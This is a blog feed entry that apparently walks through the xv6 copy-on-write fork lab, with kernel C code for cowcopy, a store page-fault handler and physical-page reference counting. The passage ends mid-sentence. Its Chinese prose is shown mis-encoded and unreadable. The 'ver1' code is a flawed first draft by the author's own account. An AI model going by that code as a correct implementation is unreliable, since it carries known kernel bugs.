<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Tech_Islet</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-07-17T13:41:23.358Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>è˜‹æœ«é£</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>6.s081 Lab: Copy-on-Write Fork</title>
    <link href="http://example.com/2025/07/17/Lab-cow/"/>
    <id>http://example.com/2025/07/17/Lab-cow/</id>
    <published>2025-07-17T13:39:26.689Z</published>
    <updated>2025-07-17T13:41:23.358Z</updated>
    
    <content type="html"><![CDATA[<h1 id="cow-fork-ä»»åŠ¡èƒŒæ™¯"><a class="markdownIt-Anchor" href="#cow-fork-ä»»åŠ¡èƒŒæ™¯"></a> COW fork ä»»åŠ¡èƒŒæ™¯</h1><p><code>fork</code> å‡ºçš„å­è¿›ç¨‹éœ€è¦å¤åˆ¶å…¶çˆ¶è¿›ç¨‹çš„æ•´ä¸ªåœ°å€ç©ºé—´ï¼Œå…·ä½“æ¥è¯´å®ƒè¦è°ƒç”¨ <code>uvmcopy()</code> å¤åˆ¶æ•´ä¸ªé¡µè¡¨ï¼ŒæŠŠåŸæœ¬çš„æ•°æ®å…¨éƒ¨å¤åˆ¶åˆ°æ–°ç”³è¯·çš„ç‰©ç†é¡µä¸­ã€‚å¦‚æœçˆ¶è¿›ç¨‹å ç”¨çš„å†…å­˜å¾ˆå¤§çš„è¯ï¼Œé‚£ä¹ˆå¤åˆ¶å°±äº§ç”Ÿä¸å°çš„å¼€é”€äº†ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ <code>fork</code> åä¼šç›´æ¥ <code>exec</code> åŠ è½½æ–°çš„ç¨‹åºï¼Œè¿™éœ€è¦æ¸…ç†æ—§åœ°å€ç©ºé—´ï¼Œåˆšå¤åˆ¶çš„ç‰©ç†é¡µå’Œé¡µè¡¨ä¼šè¢«<code>proc_freepagetable</code>ä¸€ä¸€é‡Šæ”¾æ‰ï¼Œä¹‹å‰çš„å¤åˆ¶å·¥ä½œå˜æˆå¾’åŠ³ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// å¤åˆ¶çˆ¶è¿›ç¨‹åœ°å€ç©ºé—´åˆ°å­è¿›ç¨‹</span></span><br><span class="line">  <span class="keyword">if</span>(uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(np);</span><br><span class="line">    release(&amp;np-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/exec.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">exec</span><span class="params">(<span class="type">char</span> *path, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">  <span class="comment">// åˆ›å»ºä¸€ä¸ªå…¨æ–°çš„é¡µè¡¨æ¥æ„å»ºæ–°ç¨‹åºçš„åœ°å€ç©ºé—´</span></span><br><span class="line">  <span class="type">pagetable_t</span> pagetable = <span class="number">0</span>, oldpagetable;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span>((pagetable = proc_pagetable(p)) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åŠ è½½ç¨‹åºåˆ°å†…å­˜ä¸­</span></span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>, off=elf.phoff; i&lt;elf.phnum; i++, off+=<span class="keyword">sizeof</span>(ph))&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  oldpagetable = p-&gt;pagetable; </span><br><span class="line">  p-&gt;pagetable = pagetable;   <span class="comment">// åˆ‡æ¢è¿›ç¨‹æ ¹é¡µè¡¨</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  proc_freepagetable(oldpagetable, oldsz); <span class="comment">// æ¸…ç†å’Œé‡Šæ”¾æ—§ç©ºé—´ï¼</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¿å…æ— æ•ˆå¤åˆ¶çš„æ–¹æ³•å°±æ˜¯å»¶è¿Ÿå¤åˆ¶æ“ä½œï¼Œç­‰åˆ°çœŸæ­£éœ€è¦çš„æ—¶å€™å†ä»çˆ¶è¿›ç¨‹ä¸­å¤åˆ¶åˆ°è¿›ç¨‹ç©ºé—´é‡Œã€‚Copy-on-Write fork å°±æ˜¯åˆ©ç”¨ page fault å®ç°äº†è¿™ç§æƒ³æ³•ï¼šåœ¨ <code>fork</code> ä¹‹åˆå­è¿›ç¨‹å°†æ˜ å°„çˆ¶è¿›ç¨‹çš„æ‰€æœ‰ç‰©ç†é¡µï¼ˆtrapframeé¡µæ˜¯ç§æœ‰çš„ï¼‰ï¼ŒåŒæ—¶æŠŠ parent å’Œ child çš„é¡µè¡¨çš„é¡µè¡¨é¡¹æƒé™è®¾ç½®ä¸ºåªè¯» <code>PTE_R</code>ã€‚</p><p>å½“å…¶ä¸­ä¸€ä¸ªè¿›ç¨‹ï¼ˆå­è¿›ç¨‹æˆ–çˆ¶è¿›ç¨‹ï¼‰è¦å†™å…¥æ•°æ®çš„æ—¶å€™ï¼Œè§¦å‘ page faultï¼Œå†…æ ¸ trap handler ä¸ºå…¶åˆ†é…ç‰©ç†é¡µï¼Œå¹¶æŠŠåŸæœ¬çš„ç‰©ç†é¡µæ•°æ®å¤åˆ¶ä¸€ä»½åˆ°æ–°çš„ç‰©ç†é¡µä¸­ï¼Œé‡æ–°æ‰§è¡Œå‰é¢é€ æˆéæ³•è®¿é—®çš„æŒ‡ä»¤ã€‚åœ¨è¯¥è¿›ç¨‹çš„è§†è§’é‡Œè¿™äº›å†…æ ¸çš„æ“ä½œéƒ½æ˜¯é€æ˜çš„ï¼ˆtransparentï¼‰ã€‚</p><h1 id="implement-copy-on-write-fork"><a class="markdownIt-Anchor" href="#implement-copy-on-write-fork"></a> Implement copy-on-write fork</h1><blockquote><p><strong>Your task is to implement copy-on-write fork in the xv6 kernel.</strong> You are done if your modified kernel executes both the <code>cowtest</code> and <code>usertests -q</code> programs successfully.</p></blockquote><p>è¯´å®è¯ï¼Œä¸€å¼€æ—¶è§‰å¾—è¿™ä¸ªä»»åŠ¡çš„éœ€æ±‚å¾ˆæ¸…æ™°æ˜äº†ï¼Œæ„Ÿè§‰å®ç°èµ·æ¥åº”è¯¥æ˜¯ä¸éš¾çš„ï¼Œä½†æ˜¯å®é™…ä¸Šæ‰‹æ„Ÿè§‰éš¾åº¦é«˜è¿‡å‰é¢åšçš„ superpage ï¼Œæœ‰è®¸å¤šçš„ç»†èŠ‚éœ€è¦æ³¨æ„ã€‚ç”±äºå¯¹è¿™ä¸ªæƒ³æ³•æ¯”è¾ƒæ„Ÿå…´è¶£ï¼Œæˆ‘ä¸€å¼€å§‹å¹¶æ²¡æœ‰çœ‹å®éªŒä¹¦ç»™çš„ hintsï¼Œè€Œæ˜¯æŒ‰ç…§è‡ªå·±çš„æƒ³æ³•å»å°è¯•å®ç°çš„ï¼Œæ‰€ä»¥ç¢°åˆ°äº†ä¸å°‘é—®é¢˜ã€‚åœ¨ä¸‹é¢çš„åˆ†æä¸ç¼–ç ä¸­æˆ‘ç¬¬ä¸€ä¸ªç‰ˆæœ¬çš„å®ç°ä¼šå†™å‡ºæ¥åˆ†æï¼Œæœ€ç»ˆçš„å®ç°æ€è·¯ä¹Ÿä¼šå†™å‡ºæ¥ã€‚</p><hr><h2 id="ver1-fork-å¤åˆ¶é¡µè¡¨"><a class="markdownIt-Anchor" href="#ver1-fork-å¤åˆ¶é¡µè¡¨"></a> ver1. fork å¤åˆ¶é¡µè¡¨</h2><p>COW fork å®ç°çš„æ€è·¯æ˜ç¡®ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥ä» <code>fork</code> é¡ºç€ page fault æ²¿ç€æŠ½è±¡å±‚æ¬¡å‘ä¸‹æ ¹æ®é—®é¢˜å®ç°éœ€æ±‚ã€‚</p><p>é¦–å…ˆ <code>fork</code> ä¸èƒ½ä¸ºå­è¿›ç¨‹åˆ†é…ç‰©ç†é¡µï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠçˆ¶è¿›ç¨‹çš„æ‰€æœ‰ PTEs å¤åˆ¶åˆ°å­è¿›ç¨‹çš„é¡µè¡¨ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´æŠŠçˆ¶è¿›ç¨‹æ‰€æœ‰çš„ç‰©ç†é¡µæ˜ å°„åˆ°äº†å­è¿›ç¨‹çš„åœ°å€ç©ºé—´å†…ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­æˆ‘ä»¬é‡åˆ°ç¬¬ä¸€ä¸ªéœ€æ±‚ï¼š<strong>å¯¹äºåŸæœ¬å¯å†™ï¼ˆè®¾ç½®äº†PTE_Wæƒé™ï¼‰çš„é¡µï¼Œè¦åœ¨çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹çš„é¡µè¡¨ä¸­è®¾ç½®ä¸ºä¸å¯å†™ã€‚</strong></p><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œï¼ˆQ1ï¼‰å½“åé¢ page fault å‘ç”Ÿæ—¶ï¼Œæ€ä¹ˆåŒºåˆ†è¯¥è™šæ‹Ÿåœ°å€æ˜¯çœŸçš„æ²¡æœ‰å†™æƒé™è¿˜æ˜¯ COW fork éœ€è¦å¤åˆ¶ç‰©ç†é¡µï¼Ÿ</p><p>ç¬¬ä¸€ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯åˆ©ç”¨å¯¹ç‰©ç†é¡µçš„å¼•ç”¨è®¡æ•° <code>pprefcnt[i]</code> ï¼ˆphysical page reference countï¼‰è¿›è¡Œåˆ¤æ–­ã€‚å¼•ç”¨è®¡æ•°æ˜¯ COW çš„å¦ä¸€ä¸ªéœ€æ±‚ï¼Œéœ€è¦ç»´æŠ¤å¯¹ä¸€ä¸ªç‰©ç†é¡µé¢æ‰€æœ‰è¿›ç¨‹çš„å¼•ç”¨æ•°ï¼Œå½“ <code>refcnt</code> ä¸º 0 æ—¶ï¼Œæˆ‘ä»¬æ‰èƒ½å°†å…¶é‡Šæ”¾åˆ° freelist ã€‚åŒæ—¶å¼•ç”¨è®¡æ•°ä¹Ÿå¸¦æ¥äº†ä¸€ä¸ªä¼˜åŒ–ï¼Œåœ¨åé¢å®ç°ä¸­ä¼šæåˆ°ï¼ˆxv6 bookï¼‰ã€‚</p><p>ç”±äº <code>uvmcopy</code> å…·æœ‰é€šç”¨æ€§ï¼Œå¯èƒ½å­˜åœ¨å¤åˆ¶é¡µè¡¨ä¹Ÿé¡»å¤åˆ¶ç‰©ç†é¡µçš„éœ€æ±‚ï¼Œæ‰€ä»¥æˆ‘ä¸€å¼€å§‹å®ç°äº†ä¸€ä¸ªç±»ä¼¼çš„ <code>cowcopy</code> ï¼Œ <code>fork</code> ç”¨è¿™ä¸ªå‡½æ•°è€Œéé€šç”¨çš„ <code>uvmcopy</code> ã€‚ä½¿ç”¨ <code>mappages</code> æ„å»ºæ˜ å°„åæˆ‘ä»¬éœ€è¦é€’å¢çˆ¶è¿›ç¨‹ç‰©ç†é¡µçš„å¼•ç”¨æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/vm.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">cowcopy</span><span class="params">(<span class="type">pagetable_t</span> old, <span class="type">pagetable_t</span> new, uint64 sz)</span>&#123;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line">  uint64 n;   <span class="comment">// index of pprefcnt</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pa = PTE2PA(*pte);</span><br><span class="line">    flags = PTE_FLAGS(*pte) &amp; ~PTE_W;  <span class="comment">// clear PTE_W</span></span><br><span class="line">    n = ((uint64)pa-KERNBASE)/PGSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set both parent and child&#x27;s PTE to read-only</span></span><br><span class="line">    <span class="keyword">if</span>(mappages(new, i, PGSIZE, pa, flags) != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="comment">// can not alloc a pagetable page</span></span><br><span class="line">      <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    *pte &amp;= ~PTE_W;</span><br><span class="line"></span><br><span class="line">    acquire(&amp;reflock);</span><br><span class="line">    pprefcnt[n]++;</span><br><span class="line">    release(&amp;reflock);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err:</span><br><span class="line">  <span class="comment">// not to free physical page from parent</span></span><br><span class="line">  uvmunmap(new, <span class="number">0</span>, i / PGSIZE, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/proc.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// ä»…å¤åˆ¶é¡µè¡¨ï¼Œä¸å¤åˆ¶å®é™…ç‰©ç†é¡µ</span></span><br><span class="line">  <span class="keyword">if</span>(cowcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(np);</span><br><span class="line">    release(&amp;np-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="ver1-usertrap-å¤„ç†é¡µé”™è¯¯"><a class="markdownIt-Anchor" href="#ver1-usertrap-å¤„ç†é¡µé”™è¯¯"></a> ver1. usertrap å¤„ç†é¡µé”™è¯¯</h2><p>å¯¹äº COW å¤åˆ¶çš„é¡µï¼Œç”±äºæ²¡æœ‰å†™æƒé™ï¼Œå­è¿›ç¨‹ï¼ˆæˆ–çˆ¶è¿›ç¨‹ï¼‰å°è¯•å†™å…¥è¯¥è™šæ‹Ÿåœ°å€æ—¶ä¼šå‘ç”Ÿ page faultï¼ŒRISC-V è§„å®šè¿™ç§éæ³•å†™å…¥çš„ <code>scause</code> ä¸º <code>0xf</code>ï¼ˆ15ï¼‰ã€‚</p><p>å› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦ä¿®æ”¹ <code>usertrap()</code> å¯¹äº page fault çš„å¤„ç†é€»è¾‘ï¼Œå½“å†™å…¥ COW  é¡µæ—¶éœ€è¦åˆ†é…å®é™…çš„ç‰©ç†é¡µå¹¶å¤åˆ¶åŸæœ¬ç‰©ç†é¡µçš„æ•°æ®ï¼Œå†é‡æ–°æ‰§è¡Œå‡ºé”™çš„å†™å…¥æŒ‡ä»¤ï¼ˆåœ°å€ä¿å­˜åœ¨äº† <code>trapframe-&gt;epc</code>ï¼‰ã€‚</p><p>å¯¹äºéæ³•å†™å…¥çš„å¤„ç†æˆ‘ä»¬éœ€è¦åŒºåˆ†æ˜¯å¦æ˜¯ COW é¡µï¼ˆQ1ï¼‰ï¼Œåœ¨ <code>pagefault_store()</code> çš„å°è¯•é‡Œæˆ‘é€šè¿‡ç‰©ç†é¡µçš„å¼•ç”¨è®¡æ•° <code>refcnt</code> æ˜¯å¦å¤§äº 1 æ¥ç¡®å®šè¯¥ç‰©ç†é¡µæ˜¯ç”±å¤šè¿›ç¨‹å…±äº«çš„ï¼Œè€Œæˆ‘ä»¬çš„å®ç°é‡Œåªæœ‰ <code>fork</code> ä¼šå…±äº«ç‰©ç†é¡µï¼Œæ‰€ä»¥è¯¥é¡µæ˜¯ COW é¡µï¼Œéœ€è¦æˆ‘ä»¬æ‰§è¡Œå¤åˆ¶é€»è¾‘ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/trap.c: usertrap()</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(r_scause() == <span class="number">0xf</span>)&#123;</span><br><span class="line">      <span class="comment">// Store/AMO page fault</span></span><br><span class="line">      pagefault_store();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, r_scause(), p-&gt;pid);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    &#125;</span><br><span class="line">    setkilled(p);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/trap.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pagefault_store</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span>* <span class="title">p</span>;</span></span><br><span class="line">  uint64 faulting_va, pa, n;</span><br><span class="line">  uint flags;</span><br><span class="line">  <span class="type">int</span> cow_page = <span class="number">0</span>;  <span class="comment">// 1 if it is cow page</span></span><br><span class="line">  <span class="type">pte_t</span>* pte;</span><br><span class="line">  <span class="type">char</span>* mem;</span><br><span class="line"></span><br><span class="line">  p = myproc();</span><br><span class="line">  faulting_va = r_stval();</span><br><span class="line"></span><br><span class="line">  pte = walk(p-&gt;pagetable, faulting_va, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(pte == <span class="number">0</span> || (*pte &amp; PTE_V) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// no physical page mapped to pte</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pagefault_store(): no mapping pid=%d\n&quot;</span>, p-&gt;pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  pa = PTE2PA(*pte);</span><br><span class="line">  n = ((uint64)pa-KERNBASE)/PGSIZE;</span><br><span class="line"></span><br><span class="line">  acquire(&amp;reflock);</span><br><span class="line">  <span class="keyword">if</span>(pprefcnt[n] &gt; <span class="number">1</span>)</span><br><span class="line">    cow_page = <span class="number">1</span>;</span><br><span class="line">  release(&amp;reflock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(cow_page != <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">// invalid store, PTE_W == 0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pagefault_store(): invalid store instrution pid=%d\n&quot;</span>, p-&gt;pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// copy the physical page and remap pte</span></span><br><span class="line">  flags = PTE_FLAGS(*pte) | PTE_W;</span><br><span class="line">  <span class="keyword">if</span>((mem = kalloc()) == <span class="number">0</span>)&#123;</span><br><span class="line">    panic(<span class="string">&quot;pagefault_store(): no more memory to alloc&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  memmove(mem, (<span class="type">char</span>*)pa, PGSIZE);</span><br><span class="line">  *pte = PA2PTE(mem) | flags;</span><br><span class="line"></span><br><span class="line">  acquire(&amp;reflock);</span><br><span class="line">  pprefcnt[n]--;</span><br><span class="line">  release(&amp;reflock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸºäºå¼•ç”¨è®¡æ•°è¿›è¡Œ COW é¡µåˆ¤æ–­çš„ <code>pagefault_store</code> å®ç°å­˜åœ¨å¾ˆå¤šç»†èŠ‚çš„é—®é¢˜ã€‚å½“ä¸€ä¸ª COW é¡µçš„å¼•ç”¨ <code>refcnt</code> ä¸º 1 æ—¶ï¼Œå¯¹åº”çš„è¿›ç¨‹å¦‚æœå‘ç”Ÿå†™å…¥çš„ page faultï¼Œæˆ‘ä»¬æ— éœ€é‡æ–°æ ¹æ®è¿™ä¸ªç‰©ç†é¡µåˆ†é…ä¸€ä¸ªæ–°çš„ç‰©ç†é¡µäº†ï¼Œç›´æ¥ä¿®æ”¹ PTE æƒé™å°±å¯ä»¥ï¼ˆè¿™å°±æ˜¯å‰é¢æåˆ°çš„ä¼˜åŒ–ï¼‰ã€‚ä½†æ˜¯è¿™ä¸ªä¼˜åŒ–åœ¨ä¸Šè¿°çš„é€»è¾‘é‡Œå®ç°ä¸äº†ï¼šå½“ä¸€ä¸ªè¿›ç¨‹é¦–å…ˆè§¦å‘ page faultï¼Œè¯¥ç‰©ç†é¡µçš„ <code>refcnt</code> å˜ä¸ºäº† 1 ï¼Œæ­¤æ—¶å¦ä¸€ä¸ªè¿›ç¨‹ä¹Ÿå°è¯•å†™å…¥ï¼Œä½†æ˜¯é€»è¾‘åˆ¤æ–­è¯¥é¡µä¸æ˜¯ COW é¡µï¼Œè€Œæ˜¯ä¸€ä¸ªç§æœ‰çš„é¡µï¼Œå®ƒæœ¬æ¥å°±æ²¡æœ‰å†™å…¥æƒé™ï¼Œè¿™æ ·çš„ç»“æœæ˜¾ç„¶æ˜¯é”™è¯¯çš„ã€‚è¦æƒ³ä¿®æ­£æˆ‘ä»¬éœ€è¦æ·»åŠ é¢å¤–çš„é€»è¾‘ï¼ŒåŒæ—¶è¿˜è¦ç»´æŠ¤å¥½ç‰©ç†é¡µçš„å¼•ç”¨è®¡æ•°ï¼Œè¿™ä½¿å¾—æƒ…å†µå˜å¾—å¾ˆå¤æ‚ã€‚</p><h2 id="ver1-kallockfree-åº•å±‚ç‰©ç†é¡µç®¡ç†"><a class="markdownIt-Anchor" href="#ver1-kallockfree-åº•å±‚ç‰©ç†é¡µç®¡ç†"></a> ver1. kalloc/kfree åº•å±‚ç‰©ç†é¡µç®¡ç†</h2><p>å…³äº COW é¡µé‡Šæ”¾ï¼Œæˆ‘ä»¬éœ€è¦ä¸€å¥— â€œbookkeepingâ€ ç­–ç•¥æ¥ç»´æŠ¤å¯¹ç‰©ç†é¡µå¼•ç”¨çš„è®¡æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/kalloc.c</span></span><br><span class="line">uint pprefcnt[(PHYSTOP-KERNBASE)/PGSIZE];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">reflock</span>;</span></span><br></pre></td></tr></table></figure><p>å¯¹äºæ¯ä¸€ä¸ªç‰©ç†é¡µï¼ˆåœ°å€0x80000000~0x88000000ï¼‰ï¼Œæˆ‘ä»¬ä»¥ <code>(pa-KERNBASE)/PGSIZE</code> ä½œä¸ºå¼•ç”¨è®¡æ•°æ•°ç»„çš„ indexï¼ŒåŒæ—¶ä¸ºäº†ä¿æŠ¤ <code>pprefcnt</code> è¿™ä¸ªå…¨å±€å¯¹è±¡çš„å®‰å…¨è¯»å†™ï¼Œéœ€è¦ä¸€ä¸ªè‡ªæ—‹é”æ¥å®ç°äº’æ–¥ã€‚</p><p>ç°åœ¨æ¯ä¸ªç‰©ç†é¡µç›¸å½“äºå¤šäº†ä¸€ä¸ªå­—æ®µ <code>pprefcnt</code> ç”¨æ¥æŒ‡ç¤ºè¢«é¡µè¡¨çš„æ˜ å°„æ•°ã€‚è€Œæ¥ä¸‹æ¥å¯¹äºç‰©ç†é¡µçš„ç®¡ç†æ¶‰åŠåˆ°äº†ä¸€ä¸ªè®¾è®¡ä¸Šçš„é—®é¢˜ï¼ˆQ2ï¼‰ï¼šåœ¨ <code>kfree</code> ä¸­åˆ¤æ–­æ˜¯å¦çœŸçš„éœ€è¦é‡Šæ”¾è¿™ä¸ªç‰©ç†é¡µï¼ˆç»™ä¸Šå±‚æŠ½è±¡ï¼Œæ— éœ€æ”¹åŠ¨å…¶ä½™æ¶‰åŠ <code>kfree</code> çš„ä»£ç ï¼‰or  å®ç° <code>kfree</code> ä¸ºçœŸçš„é‡Šæ”¾è¿™ä¸ªç‰©ç†é¡µï¼Œé‚£ä¹ˆå°±éœ€è¦ç”±ä¸Šå±‚æ¥ç»´æŠ¤ <code>refcnt</code>ï¼Œå½“å¼•ç”¨ä¸º 0 æ—¶æ‰å®é™…è°ƒç”¨ï¼Ÿ</p><ol><li><code>kfree</code>Â ä¸å†æ˜¯â€œæ— æ¡ä»¶é‡Šæ”¾â€ï¼Œè€Œæ˜¯â€œ<strong>æ£€æŸ¥å¹¶é‡Šæ”¾</strong>â€ã€‚ä¸Šå±‚ä»£ç ï¼ˆå¦‚Â <code>uvmunmap</code>ï¼‰ä¸€æ ·åœ¨è§£é™¤ä¸€ä¸ª PTE æ˜ å°„åï¼Œæ— è„‘åœ°è°ƒç”¨Â <code>kfree(pa)</code>ã€‚çœŸæ­£çš„é‡Šæ”¾å†³ç­–ç”±Â <code>kfree</code>Â 